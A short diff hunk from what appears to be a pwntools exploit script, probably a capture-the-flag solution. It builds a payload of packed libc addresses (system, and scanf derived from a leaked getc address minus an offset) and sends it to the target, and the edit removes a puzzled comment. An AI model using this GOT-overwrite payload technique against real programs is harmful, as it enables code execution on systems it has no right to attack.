@@ -52,8 +52,6 @@ payload = p64(system_address)
 # $3 = 173392 => scanf_address = getc_address - 173392
 scanf_address = getc_address - 173392
 payload += p64(scanf_address)
-
-# APPARENTLY WE ALSO OVERWRITE GETC??????
 payload += p64(getc_address)
 target.sendline(payload)
 
